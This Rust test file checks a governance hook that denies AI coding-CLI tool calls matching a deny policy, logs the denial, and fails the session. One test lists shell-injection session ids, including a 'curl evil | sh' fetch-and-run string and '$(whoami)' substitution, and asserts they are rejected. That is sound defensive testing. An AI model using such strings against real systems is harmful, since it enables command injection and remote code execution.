//! core#24 — GOVERNANCE-IN-RUN keystone (DES-OUTGOV-003).
//!
//! Two halves prove the milestone deterministically (no real `claude`):
//!  1. `real_gate_hook_denies_a_tripping_tool_call_and_records_it` — the REAL `wicked-core gate-hook`
//!     binary (what claude spawns per PreToolUse) denies a tool-call that trips a seeded deny policy
//!     (exit 2) AND appends the `Deny` to the decisions log. (the hook half: select→decide→append→exit2)
//!  2. `a_denied_tool_call_fails_the_session` — a GOVERNED run whose worker records a `Deny` in the run's
//!     decisions log (what half 1 produces) drives the **session to `Failed`** through the engine's own
//!     per-unit deny-dominant gate. (the fold half — the corrected design's whole point)

use std::io::Write;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::time::{Duration, Instant};

use wicked_apps_core::{open_store, ConformanceClaim, Decision};
use wicked_core::{
    decisions_path_for, gov_run_dir, Core, EntityMode, HumanConfirm, LaunchSpec, SessionStatus,
    StepInput, StepOutput, StepRunner, StepStatus,
};
use wicked_council::types::{Category, Confidence, Dispatcher, InputMode, Vote};
use wicked_council::{AgenticCli, CouncilTask};
use wicked_governance::{register_policy, Effect, Policy, Severity, Trigger};

const BIN: &str = env!("CARGO_BIN_EXE_wicked-core");

fn scratch(name: &str) -> std::path::PathBuf {
    let dir = std::env::temp_dir().join(format!("wc-govrun-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

/// A hard-DENY policy selected for `phase` that fires whenever the context contains `DENYME`.
fn deny_policy(phase: &str) -> Policy {
    Policy {
        id: "pol-deny-denyme".into(),
        kind: "policy".into(),
        applies_to: vec![phase.to_string()],
        effect: Effect::Deny,
        trigger: Trigger {
            contains: Some("DENYME".into()),
        },
        obligations: vec![],
        criteria: "no DENYME in a tool-call".into(),
        severity: Severity::High,
        rule: "tool-calls containing DENYME are denied".into(),
        retired: false,
    }
}

#[test]
fn real_gate_hook_denies_a_tripping_tool_call_and_records_it() {
    let dir = scratch("hook");
    let db = dir.join("estate.db");
    let db_s = db.to_str().unwrap().to_string();
    {
        let mut store = open_store(Some(&db_s)).unwrap();
        register_policy(&mut store, &deny_policy("unit-1")).unwrap();
    }
    let decisions = dir.join("decisions.ndjson");
    // A tool-call that trips the deny policy (its `command` contains DENYME).
    let tool_call = r#"{"tool_name":"Bash","tool_input":{"command":"echo DENYME"}}"#;

    let mut child = Command::new(BIN)
        .args([
            "gate-hook",
            "--scope",
            "wicked-agent/r/unit/s:u1",
            "--phase",
            "unit-1",
        ])
        // The launcher supplies the store path via env (the injected command drops --db).
        .env("WICKED_GATE_DB", &db_s)
        .env("WICKED_DECISIONS_PATH", &decisions)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("spawn gate-hook");
    child
        .stdin
        .take()
        .unwrap()
        .write_all(tool_call.as_bytes())
        .unwrap();
    let status = child.wait().unwrap();
    assert_eq!(
        status.code(),
        Some(2),
        "a tripping tool-call is DENIED with exit 2 (claude aborts the call)"
    );
    let log = std::fs::read_to_string(&decisions).expect("decisions log written");
    let claim: ConformanceClaim = log
        .lines()
        .filter_map(|l| serde_json::from_str(l.trim()).ok())
        .next()
        .expect("a claim was appended");
    assert_eq!(
        claim.decision,
        Decision::Deny,
        "the recorded claim is a Deny"
    );
    assert_eq!(claim.phase, "unit-1", "recorded at the unit's real phase");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn gate_hook_via_env_db_resolves_without_an_explicit_db_flag() {
    // The injected command drops `--db`; the subcommand must fall back to the env (finding #6).
    //
    // The variable is `WICKED_GATE_DB`, NOT `WICKED_ESTATE_DB` (FINDING-067) — the hook is a
    // grandchild of the worker, so whatever carries this path is also visible to every tool the worker
    // spawns, and under the old name `wicked-estate index .` in a worker's Bash call resolved its
    // `--db` to the platform's operational store and swept it. Both halves are asserted: the new name
    // RESOLVES, and the old name does NOT. A tolerated alias would quietly restore the whole channel.
    let dir = scratch("envdb");
    let db = dir.join("estate.db");
    let db_s = db.to_str().unwrap().to_string();
    open_store(Some(&db_s)).unwrap(); // create the store (no policies ⇒ Allow)
    let decisions = dir.join("decisions.ndjson");
    let run_hook = |var: &str| {
        let mut child = Command::new(BIN)
            .args(["gate-hook", "--scope", "s", "--phase", "unit-1"])
            .env(var, &db_s)
            .env("WICKED_DECISIONS_PATH", &decisions)
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .expect("spawn");
        child
            .stdin
            .take()
            .unwrap()
            .write_all(br#"{"tool_name":"Read","tool_input":{"file_path":"/x"}}"#)
            .unwrap();
        child.wait().unwrap().code()
    };
    assert_eq!(
        run_hook("WICKED_GATE_DB"),
        Some(0),
        "no policy matches ⇒ ALLOW (exit 0); the store resolved from WICKED_GATE_DB, not a garbage file"
    );
    assert_eq!(
        run_hook("WICKED_ESTATE_DB"),
        Some(2),
        "the old name must NOT resolve the hook's store — an unresolvable store fails CLOSED (deny), \
         which is also how a stale launcher surfaces instead of evaluating against zero policies"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

// ── the keystone: a recorded Deny fails the SESSION ──────────────────────────────────────────────────

/// A runner that simulates the PreToolUse gate-hook having fired during the CLI run: for a GOVERNED unit
/// it appends a `Deny` claim to the run's decisions log at the unit's REAL phase (exactly what
/// `wicked-core gate-hook` appends when a tool-call trips a deny policy), then returns normal output.
struct HookDenyRunner;
impl StepRunner for HookDenyRunner {
    fn run_unit(&self, i: &StepInput) -> StepOutput {
        // A real campaign unit on a file-backed store MUST be governed (input governance armed).
        assert!(
            i.governance.is_some(),
            "a campaign unit on a file db must carry a governance context (opt-in armed)"
        );
        let phase = format!("unit-{}", i.unit.ord);
        let claim = ConformanceClaim {
            claim_id: format!("hookdeny-{}", i.unit.ord),
            scope: "wicked-agent/gov-fail/unit/x".into(),
            phase: phase.clone(),
            policy_ids: vec!["pol-deny-denyme".into()],
            decision: Decision::Deny,
            obligations: vec![],
            evaluated_context_ref: "sha256:test".into(),
            criteria: "no DENYME".into(),
            evaluator_identity: "wicked-governance".into(),
            evaluated_at: 1_750_000_000,
        };
        let path = decisions_path_for(&i.run_id, i.attempt);
        if let Some(p) = path.parent() {
            let _ = std::fs::create_dir_all(p);
        }
        let mut line = serde_json::to_string(&claim).unwrap();
        line.push('\n');
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
            .unwrap();
        f.write_all(line.as_bytes()).unwrap();

        StepOutput {
            run_id: i.run_id.clone(),
            unit_ix: i.unit_ix,
            attempt: i.attempt,
            output: "did the work".into(),
            status: StepStatus::Ok, // the CLI itself SUCCEEDS — only governance denies
            usage: None,
            files: Vec::new(),
            tools: Vec::new(),
            governed: false,
        }
    }
}

struct FixedDispatcher;
impl Dispatcher for FixedDispatcher {
    fn dispatch(&self, cli: &AgenticCli, _t: &CouncilTask) -> Option<Vote> {
        Some(Vote {
            cli: cli.key.clone(),
            recommendation: "a".into(),
            top_risk: "none".into(),
            change_my_mind: "no".into(),
            disqualifier: None,
            confidence: Confidence::default(),
            provenance: "fixed".into(),
        })
    }
}

fn cli(key: &str) -> AgenticCli {
    AgenticCli {
        key: key.into(),
        display_name: key.into(),
        binary: "unused".into(),
        headless_invocation: "unused {PROMPT}".into(),
        category: Category::default(),
        input_mode: InputMode::default(),
        version_probe: vec![],
        trust_flags: vec![],
        alt_binaries: vec![],
        confidence: Confidence::default(),
        enabled_for_council: true,
        acp: None,
        capabilities: None,
        login_invocation: None,
    }
}

/// Upper bound on how long a governed run may take before the test gives up.
///
/// Same reasoning as `domain_extraction_e2e`'s `RUN_DEADLINE` (FINDING-028), and the same defect
/// this file carried independently: the wait returns the instant the run goes terminal, so a
/// generous bound costs nothing on an idle host and is only ever spent on a run that is genuinely
/// stuck. The previous 6s was reachable by scheduling noise alone — under `cargo test --all` on a
/// loaded host this test failed while `cargo test --test governance_in_run` passed 8/8, which is a
/// test reporting a governance defect that isn't there.
const RUN_DEADLINE: Duration = Duration::from_secs(60);

/// Waits for `run_id` to reach a terminal status.
///
/// `Err` rather than `None` on timeout, because the two outcomes accuse different things: a run that
/// terminated in the wrong status is a governance defect, while a run that never terminated is this
/// host being slow. Collapsing them into `Option` made a timeout read as "governance did not fail
/// the session".
fn wait_terminal(core: &Core, run_id: &str) -> Result<SessionStatus, String> {
    let deadline = Instant::now() + RUN_DEADLINE;
    let mut last = None;
    while Instant::now() < deadline {
        if let Ok(v) = core.sessions_detail() {
            if let Some(s) = v.iter().find(|s| s.session.id == run_id) {
                if matches!(
                    s.session.status,
                    SessionStatus::Completed | SessionStatus::Failed | SessionStatus::Cancelled
                ) {
                    return Ok(s.session.status);
                }
                last = Some(s.session.status);
            }
        }
        std::thread::sleep(Duration::from_millis(15));
    }
    Err(format!(
        "run {run_id} never reached a terminal status within {}s — it was still {} when the wait \
         gave up, so this is a timeout, not a governance outcome",
        RUN_DEADLINE.as_secs(),
        last.map_or_else(
            || "absent from sessions_detail".to_string(),
            |s| format!("{s:?}")
        )
    ))
}

#[test]
fn a_denied_tool_call_fails_the_session() {
    let dir = scratch("keystone");
    let db = dir.join("estate.db");
    // Clean any stale governance dir for this run id (launch_run_inner also clears it on a fresh launch).
    let _ = std::fs::remove_dir_all(gov_run_dir("gov-fail"));

    let core = Core::spawn_with_engine(
        db.to_str().unwrap().to_string(),
        Arc::new(FixedDispatcher),
        Arc::new(HookDenyRunner),
    );
    core.launch_run(LaunchSpec {
        project_id: None,
        problem: "Build the thing".into(),
        clis: vec![cli("a"), cli("b")],
        entity_mode: EntityMode::Isolated,
        session_id: "gov-fail".into(),
        human_confirm: HumanConfirm::None,
        repo_ref: None,
        workflow: None,
        extra_write_roots: Vec::new(),
        project_graph: None,
    })
    .unwrap();

    let status = wait_terminal(&core, "gov-fail").expect("the run reaches a terminal status");
    assert_eq!(
        status,
        SessionStatus::Failed,
        "a governance-denied tool-call drives the SESSION to Failed (not a silent Completed)"
    );
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(gov_run_dir("gov-fail"));
}

#[test]
fn a_shell_hostile_session_id_is_rejected_at_launch() {
    // Defense-in-depth: even though scope/phase now ride env (not the shell hook command), a session id
    // carrying shell metacharacters is rejected at ingress — it is never a legitimate run id.
    let dir = scratch("hostile");
    let db = dir.join("estate.db");
    let core = Core::spawn_with_engine(
        db.to_str().unwrap().to_string(),
        Arc::new(FixedDispatcher),
        Arc::new(HookDenyRunner),
    );
    for hostile in [
        "x\" ; curl evil | sh ; \"",
        "$(whoami)",
        "a`id`b",
        "a;b",
        "a|b",
    ] {
        let res = core.launch_run(LaunchSpec {
            project_id: None,
            problem: "Build the thing".into(),
            clis: vec![cli("a")],
            entity_mode: EntityMode::Isolated,
            session_id: hostile.into(),
            human_confirm: HumanConfirm::None,
            repo_ref: None,
            workflow: None,
            extra_write_roots: Vec::new(),
            project_graph: None,
        });
        assert!(
            res.is_err(),
            "a shell-hostile session id must be rejected at launch: {hostile:?} → {res:?}"
        );
    }
    let _ = std::fs::remove_dir_all(&dir);
}

// ── Test-harness hygiene (core#311) — not a test ─────────────────────────────────────────────
/// Arm the hermetic emit spool BEFORE main (pre-main is single-threaded, so no test thread can
/// race it): engine paths under test fire coarse fire-and-forget `wicked.*` emissions, and with
/// no shared store configured those spool — which must land in a per-process temp file, never in
/// the operator's real `~/.something-wicked/wicked-apps/emit-outbox.ndjson` replay queue. Every
/// binary in this suite carries this block; `harness_hygiene.rs` fails the suite if one is missing.
///
/// SAFETY (`ctor(unsafe)`): runs before `main` on one thread and only sets one process env var
/// via the std API — no allocator setup, no threads, no panics across the FFI boundary.
#[ctor::ctor(unsafe)]
fn arm_hermetic_emit_spool() {
    wicked_apps_core::emit::hermetic_test_spool();
}
